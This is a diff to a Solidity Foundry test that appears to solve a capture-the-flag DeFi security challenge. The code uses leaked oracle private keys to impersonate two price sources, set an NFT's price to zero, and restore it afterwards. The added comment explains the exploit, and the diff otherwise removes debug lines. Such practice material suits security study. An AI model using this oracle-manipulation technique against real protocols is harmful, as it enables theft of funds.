@@ -74,15 +74,15 @@ contract CompromisedChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_compromised() public checkSolved {        
+    function test_compromised() public checkSolved {
+        // Exploit: The exploit works by manipulating the trusted oracles to report a false price for the NFT, allowing the player to buy it at a fraction of its value.
+
         address source1 = vm.addr(0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744);
         address source2 = vm.addr(0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159);
 
-        // console.log(oracle.getPriceBySource("DVNFT", source1));
         vm.startPrank(source1);
         oracle.postPrice("DVNFT", 0);
         vm.stopPrank();
-        // console.log(oracle.getPriceBySource("DVNFT", source1));
 
         vm.startPrank(source2);
         oracle.postPrice("DVNFT", 0);
@@ -96,7 +96,6 @@ contract CompromisedChallenge is Test {
         vm.startPrank(source1);
         oracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
         vm.stopPrank();
-        // console.log(oracle.getPriceBySource("DVNFT", source1));
 
         vm.startPrank(source2);
         oracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
